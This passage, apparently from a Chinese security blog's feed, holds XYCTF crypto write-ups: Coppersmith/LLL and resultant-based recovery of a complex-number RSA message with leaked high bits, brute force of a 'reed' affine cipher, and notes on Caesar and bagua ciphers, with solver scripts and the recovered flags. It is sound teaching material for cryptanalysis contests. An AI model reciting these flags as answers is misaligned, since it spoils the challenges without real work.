class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>分析：</strong><br>m的高位泄露，但是这里的m和c都是<strong>复数</strong>，分别从<strong>实部</strong>和<strong>虚部</strong>来看<br>$m_{re} &#x3D; mh_{re} + x$<br>$m_{im} &#x3D; mh_{im} + y$<br>$C \equiv (m_{re}+m_{im})^3 \mod n$<br>$C \equiv m_{re}^3 + 3m_{re}m_{im}^2+3m_{re}^2m_{im}+m_{im}^3 \mod n$<br>$C_{re} \equiv (mh_{re}+x)^3-3(mh_{re}+x)(mh_{im}+y)^2$<br>$C_{im} \equiv -(mh_{im}+y)^3+3(mh_{im}+y)(mh_{im}+x)^2$<br>再利用coppersmith定理，求出x，y</p><p><strong>代码：</strong></p><ul><li>方法一：套用二元coppersmith方法脚本</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ChaCha20<br><br>n = <span class="hljs-number">24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753</span><br>mh = [<span class="hljs-number">3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016</span>, <span class="hljs-number">15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552</span>]<br>C = [<span class="hljs-number">5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760</span>, <span class="hljs-number">21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752</span>]<br>enc = <span class="hljs-string">b&#x27;\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">small_roots</span>(<span class="hljs-params">f, bounds, m=<span class="hljs-number">1</span>, d=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> d:<br>        d = f.degree()<br><br>    R = f.base_ring()<br>    N = R.cardinality()<br><br>    f /= f.coefficients().pop(<span class="hljs-number">0</span>)<br>    f = f.change_ring(ZZ)<br><br>    G = <span class="hljs-type">Sequence</span>([], f.parent())<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m + <span class="hljs-number">1</span>):<br>        base = N ^ (m - i) * f ^ i<br>        <span class="hljs-keyword">for</span> shifts <span class="hljs-keyword">in</span> itertools.product(<span class="hljs-built_in">range</span>(d), repeat=f.nvariables()):<br>            g = base * prod(<span class="hljs-built_in">map</span>(power, f.variables(), shifts))<br>            G.append(g)<br><br>    B, monomials = G.coefficients_monomials()<br>    monomials = vector(monomials)<br><br>    factors = [monomial(*bounds) <span class="hljs-keyword">for</span> monomial <span class="hljs-keyword">in</span> monomials]<br>    <span class="hljs-keyword">for</span> i, factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(factors):<br>        B.rescale_col(i, factor)<br><br>    B = B.dense_matrix().LLL()<br><br>    B = B.change_ring(QQ)<br>    <span class="hljs-keyword">for</span> i, factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(factors):<br>        B.rescale_col(i, <span class="hljs-number">1</span> / factor)<br><br>    H = <span class="hljs-type">Sequence</span>([], f.parent().change_ring(QQ))<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">filter</span>(<span class="hljs-literal">None</span>, B * monomials):<br>        H.append(h)<br>        I = H.ideal()<br>        <span class="hljs-keyword">if</span> I.dimension() == -<span class="hljs-number">1</span>:<br>            H.pop()<br>        <span class="hljs-keyword">elif</span> I.dimension() == <span class="hljs-number">0</span>:<br>            roots = []<br>            <span class="hljs-keyword">for</span> root <span class="hljs-keyword">in</span> I.variety(ring=ZZ):<br>                root = <span class="hljs-built_in">tuple</span>(R(root[var]) <span class="hljs-keyword">for</span> var <span class="hljs-keyword">in</span> f.variables())<br>                roots.append(root)<br>            <span class="hljs-keyword">return</span> roots<br><br>    <span class="hljs-keyword">return</span> []<br><br>R.&lt;x,y&gt; = PolynomialRing(Zmod(n))<br>f = (mh[<span class="hljs-number">0</span>] + x)^<span class="hljs-number">3</span> - <span class="hljs-number">3</span>*(mh[<span class="hljs-number">0</span>] + x)*(mh[<span class="hljs-number">1</span>] + y)^<span class="hljs-number">2</span> - C[<span class="hljs-number">0</span>]<br>bits = <span class="hljs-number">128</span><br>roots = small_roots(f,(<span class="hljs-number">2</span>^bits,<span class="hljs-number">2</span>^bits),m=<span class="hljs-number">2</span>,d=<span class="hljs-number">3</span>)<br><br>m_re=mh[<span class="hljs-number">0</span>] + <span class="hljs-built_in">int</span>(roots[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>])<br>m_im=mh[<span class="hljs-number">1</span>] + <span class="hljs-built_in">int</span>(roots[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>])<br>ans = ChaCha20.new(key=hashlib.sha256(<span class="hljs-built_in">str</span>(m_re + m_im).encode()).digest(), nonce=<span class="hljs-string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).decrypt(enc)<br><span class="hljs-built_in">print</span>(ans)<br><span class="hljs-comment">#b&#x27;XYCTF&#123;Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>参考：<a href="https://www.cnblogs.com/11YEAGER11/p/17269139.html">二元coppersmith - 顶真珍珠 - 博客园</a></p><ul><li>方法二：利用<strong>结式</strong>分别构造两个只含x，y变量的式子，再使用一元coppersmith方法。</li></ul><p>关于结式的介绍可以看我博客：<a href="https://ramoor.github.io/2025/04/02/%E7%BB%93%E5%BC%8F%E4%B8%8ERSA/">结式与RSA - Ramoor</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ChaCha20<br><br>n = <span class="hljs-number">24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753</span><br>mh = [<span class="hljs-number">3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016</span>, <span class="hljs-number">15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552</span>]<br>C = [<span class="hljs-number">5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760</span>, <span class="hljs-number">21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752</span>]<br>enc = <span class="hljs-string">b&#x27;\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe&#x27;</span><br><br>R.&lt;x,y&gt; = PolynomialRing(Zmod(n))<br>f1 = (mh[<span class="hljs-number">0</span>] + x)^<span class="hljs-number">3</span> - <span class="hljs-number">3</span>*(mh[<span class="hljs-number">0</span>] + x)*(mh[<span class="hljs-number">1</span>] + y)^<span class="hljs-number">2</span> - C[<span class="hljs-number">0</span>]<br>f2 = <span class="hljs-number">3</span>*(mh[<span class="hljs-number">1</span>] + y)*(mh[<span class="hljs-number">0</span>] + x)^<span class="hljs-number">2</span> - (mh[<span class="hljs-number">1</span>] + y)^<span class="hljs-number">3</span> - C[<span class="hljs-number">1</span>]<br><br>h1 = f1.sylvester_matrix(f2, y).det()     <span class="hljs-comment">#利用结式消掉y</span><br>h2 = f2.sylvester_matrix(f1, x).det() <br>x_roots = h1.univariate_polynomial().monic().small_roots(X=<span class="hljs-number">2</span>**<span class="hljs-number">128</span>,beta=<span class="hljs-number">0.4</span>,epsilon=<span class="hljs-number">0.01</span>)<span class="hljs-comment">#求出x</span><br>y_roots = h2.univariate_polynomial().monic().small_roots(X=<span class="hljs-number">2</span>**<span class="hljs-number">128</span>,beta=<span class="hljs-number">0.4</span>,epsilon=<span class="hljs-number">0.01</span>)<br><span class="hljs-built_in">print</span>(x_roots)<br><span class="hljs-built_in">print</span>(y_roots)<br><br>m_re = mh[<span class="hljs-number">0</span>] + <span class="hljs-built_in">int</span>(x_roots[<span class="hljs-number">0</span>])<br>m_im = mh[<span class="hljs-number">1</span>] + <span class="hljs-built_in">int</span>(y_roots[<span class="hljs-number">0</span>])<br><br>ans = ChaCha20.new(key=hashlib.sha256(<span class="hljs-built_in">str</span>(m_re + m_im).encode()).digest(), nonce=<span class="hljs-string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).decrypt(enc)<br><span class="hljs-built_in">print</span>(ans)<br><span class="hljs-comment">#b&#x27;XYCTF&#123;Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="reed"><a href="#reed" class="headerlink" title="reed"></a>reed</h2><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">assert</span> flag.startswith(<span class="hljs-string">&#x27;XYCTF&#123;&#x27;</span>) <span class="hljs-keyword">and</span> flag.endswith(<span class="hljs-string">&#x27;&#125;&#x27;</span>)<br>flag = flag.rstrip(<span class="hljs-string">&#x27;&#125;&#x27;</span>).lstrip(<span class="hljs-string">&#x27;XYCTF&#123;&#x27;</span>)<br><br>table = string.ascii_letters + string.digits            <span class="hljs-comment">#字母+数字</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">all</span>(i <span class="hljs-keyword">in</span> table <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag)<br>r = random.Random()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PRNG</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, seed</span>):<br>        <span class="hljs-variable language_">self</span>.a = <span class="hljs-number">1145140</span><br>        <span class="hljs-variable language_">self</span>.b = <span class="hljs-number">19198100</span><br>        random.seed(seed)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        x = random.randint(<span class="hljs-variable language_">self</span>.a, <span class="hljs-variable language_">self</span>.b)<br>        random.seed(x ** <span class="hljs-number">2</span> + <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> x<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">round</span>(<span class="hljs-params">self, k</span>):<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k):<br>            x = <span class="hljs-variable language_">self</span>.<span class="hljs-built_in">next</span>()<br>        <span class="hljs-keyword">return</span> x<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">msg, a, b</span>):<br>    c = [(a * table.index(m) + b) % <span class="hljs-number">19198111</span> <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> msg]<br>    <span class="hljs-keyword">return</span> c<br><br>seed = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;give me seed: &#x27;</span>))<br>prng = PRNG(seed)<br>a = prng.<span class="hljs-built_in">round</span>(r.randrange(<span class="hljs-number">2</span>**<span class="hljs-number">16</span>))<br>b = prng.<span class="hljs-built_in">round</span>(r.randrange(<span class="hljs-number">2</span>**<span class="hljs-number">16</span>))<br>enc = encrypt(flag, a, b)<br><span class="hljs-built_in">print</span>(enc)<br></code></pre></td></tr></table></figure><p><strong>分析：</strong><br>给了许多enc序列和模数p，即知道了<br>$C_i \equiv aI[m_i]+b \mod p$<br>可得<br>$C_i-C_j\equiv a(I[m_i]-I[m_j])\mod p$<br>$a\equiv (C_i-C_j)(I[m_i]-I[m_j])\mod p$<br>$I[m_i]指m_i在表table中对应的索引。$<br>由于这里的表table只包含“字母”+“数字”，范围非常的小，同时密文序列长度也只有36左右，因此可以直接爆破。<br>爆破成功的条件设为</p><ul><li>$1145140 \leq a \leq 19198100$</li><li>$1145140 \leq b \leq 19198100$</li><li>$all(m_i &lt; len(table))$<br><strong>代码：</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>table = string.ascii_letters + string.digits<br>p = <span class="hljs-number">19198111</span><br><br>enc=[<span class="hljs-number">8622166</span>, <span class="hljs-number">8622166</span>, <span class="hljs-number">1642584</span>, <span class="hljs-number">5715427</span>, <span class="hljs-number">8622166</span>, <span class="hljs-number">1642584</span>, <span class="hljs-number">5106812</span>, <span class="hljs-number">17325341</span>, <span class="hljs-number">1625542</span>, <span class="hljs-number">1033969</span>, <span class="hljs-number">16159237</span>, <span class="hljs-number">7439020</span>, <span class="hljs-number">3366177</span>, <span class="hljs-number">17325341</span>, <span class="hljs-number">18491445</span>, <span class="hljs-number">4532281</span>, <span class="hljs-number">17325341</span>, <span class="hljs-number">459438</span>, <span class="hljs-number">459438</span>, <span class="hljs-number">3366177</span>, <span class="hljs-number">16159237</span>, <span class="hljs-number">3940708</span>, <span class="hljs-number">18491445</span>, <span class="hljs-number">9179655</span>, <span class="hljs-number">1033969</span>, <span class="hljs-number">15584706</span>, <span class="hljs-number">3366177</span>, <span class="hljs-number">8605124</span>, <span class="hljs-number">459438</span>, <span class="hljs-number">8622166</span>, <span class="hljs-number">2808688</span>, <span class="hljs-number">8622166</span>, <span class="hljs-number">2808688</span>, <span class="hljs-number">17933956</span>, <span class="hljs-number">8622166</span>, <span class="hljs-number">4549323</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(enc))<br>ans = []<br>a_ans = []<br>b_ans = []<br><span class="hljs-keyword">for</span> c_i <span class="hljs-keyword">in</span> enc:<br>    <span class="hljs-keyword">for</span> c_j <span class="hljs-keyword">in</span> enc:<br>        <span class="hljs-keyword">if</span> c_i!=c_j:<br>            c = c_i - c_j<br>            ci = c_i           <br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table:<br>                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> table:<br>                    m = table.index(i) - table.index(j)<br>                    <span class="hljs-keyword">if</span> GCD(m,p) == <span class="hljs-number">1</span>:<br>                        inv_m = inverse(m,p)<br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-keyword">continue</span><br>                    a = c * inv_m % p<br>                    b = (ci - a * table.index(i)) % p<br>                    <span class="hljs-keyword">if</span> <span class="hljs-number">1145140</span> &lt;= a &lt;= <span class="hljs-number">19198100</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1145140</span> &lt;= b &lt;= <span class="hljs-number">19198100</span>:<br>                        ans_i=<span class="hljs-string">&quot;&quot;</span><br>                        <span class="hljs-keyword">if</span> GCD(a,p):<br>                            inv_a = inverse(a,p)<br>                        <span class="hljs-keyword">else</span>:<br>                            <span class="hljs-keyword">continue</span><br>                        <span class="hljs-comment">#print(inv_a)</span><br>                        <span class="hljs-keyword">for</span> ci <span class="hljs-keyword">in</span> enc:<br>                            mi = ((ci - b)*inv_a) % p<br>                            <span class="hljs-keyword">if</span> mi &lt; <span class="hljs-built_in">len</span>(table):<br>                                m = table[mi]<br>                                ans_i += m<br>                            <span class="hljs-keyword">else</span>:<br>                                <span class="hljs-keyword">break</span><br>                        <span class="hljs-keyword">if</span> mi &gt;= <span class="hljs-built_in">len</span>(table):<br>                            <span class="hljs-keyword">break</span><br>                        <span class="hljs-keyword">else</span>:<br>                            <span class="hljs-keyword">if</span> ans_i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ans:<br>                                a_ans.append(a)<br>                                b_ans.append(b)<br>                                ans.append(ans_i)<br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ans)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a=&quot;</span>,a_ans[i],<span class="hljs-string">&quot;b=&quot;</span>,b_ans[i],<span class="hljs-string">&quot;XYCTF&#123;&quot;</span>+ans[i] + <span class="hljs-string">&quot;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>结果分析：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">36<br>a= 15125268 b= 2808688 XYCTF&#123;iifeif41M56UV1WQ1RRV69W35SVPRiaiabij&#125;<br>a= 4072843 b= 3940708 XYCTF&#123;114514fixedpointissodangerous1919810&#125;<br></code></pre></td></tr></table></figure><p>可以发现，存在两组合适的结果，其实只有第二个才是正确flag，到此应该可以猜出来，这种方式应该为非预期解，网上的诸多$GCD$方式求a，其实也不能很好地求出结果，都是非预期解。</p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>XYCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto基础篇-古典密码</title>
    <link href="/2025/04/14/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"/>
    <url>/2025/04/14/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="caesar密码（凯撒密码）"><a href="#caesar密码（凯撒密码）" class="headerlink" title="caesar密码（凯撒密码）"></a>caesar密码（凯撒密码）</h1><p><strong>介绍：</strong> 将字母表循环移<code>n</code>位。<br><strong>代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#凯撒爆破</span><br>cipher=<span class="hljs-string">&quot;AFFPGS&#123;pbatenghyngvbaf!!!&#125;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">26</span>):<br>    ans=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> cipher:<br>        <span class="hljs-keyword">if</span> j.isalpha():<br>            <span class="hljs-keyword">if</span> j.islower():<br>                ans += <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(j)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)+i)%<span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>))<br>            <span class="hljs-keyword">elif</span> j.isupper():<br>                ans += <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(j)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)+i)%<span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>))<br>        <span class="hljs-keyword">else</span>:<br>            ans +=j<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;shitf<span class="hljs-subst">&#123;i&#125;</span>:&quot;</span> +ans)<br></code></pre></td></tr></table></figure><h1 id="八卦"><a href="#八卦" class="headerlink" title="八卦"></a>八卦</h1><p><strong>介绍：</strong> 方位符号</p><ul><li><strong>乾（qián）</strong>：代表天，符号为三阳爻（☰）</li><li><strong>坤（kūn）</strong>：代表地，符号为三阴爻（☷）</li><li><strong>震（zhèn）</strong>：代表雷，符号为一阳爻在下，两阴爻在上（☳）</li><li><strong>巽（xùn）</strong>：代表风，符号为一阴爻在下，两阳爻在上（☴）</li><li><strong>坎（kǎn）</strong>：代表水，符号为一阳爻在中间，两阴爻在上下（☵）</li><li><strong>离（lí）</strong>：代表火，符号为一阴爻在中间，两阳爻在上下（☲）</li><li><strong>艮（gèn）</strong>：代表山，符号为两阳爻在下，一阴爻在上（☶）</li><li><strong>兑（duì）</strong>：代表泽，符号为两阴爻在下，一阳爻在上（☱）</li></ul><p><strong>分析：</strong> 将阳爻（yao）看作”1”，阴爻看作“0”。之后当作二进制来做。</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
      <category>Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Crypto</tag>
      
      <tag>古典密码</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISC基础篇-文档隐写</title>
    <link href="/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99/"/>
    <url>/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99/</url>
    
